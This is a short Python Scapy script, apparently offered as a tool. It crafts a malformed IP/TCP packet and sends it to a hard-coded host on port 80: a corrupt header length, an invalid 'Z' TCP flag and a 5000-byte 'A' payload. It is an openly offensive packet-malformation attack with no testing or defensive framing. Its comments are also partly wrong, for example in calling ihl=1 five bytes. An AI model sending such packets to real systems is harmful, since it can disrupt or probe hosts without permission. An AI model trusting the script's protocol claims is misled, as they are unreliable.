from scapy.all import IP, TCP, Raw, send
# Written by Lithiokride UwU

# Parameters
target_ip = "192.168.1.10"  # Target IP address
source_ip = "192.168.1.5"    # Source IP address
target_port = 80              # Common HTTP port

# Create an IP layer with an incorrect header length
ip = IP(src=source_ip, dst=target_ip, ihl=1)  # ihl=1 (5 bytes instead of 20)

# Create a TCP layer with an incorrect flags field
tcp = TCP(sport=12345, dport=target_port, flags='Z', seq=1000)  # 'Z' is not a valid TCP flag

# Create a malformed payload (for example, an overly long payload)
payload = Raw(load='A' * 5000)  # Excessive length

# Combine the layers into a single malformed packet
malformed_packet = ip / tcp / payload

# Send the malformed packet
send(malformed_packet)

print("Malformed packet sent.")
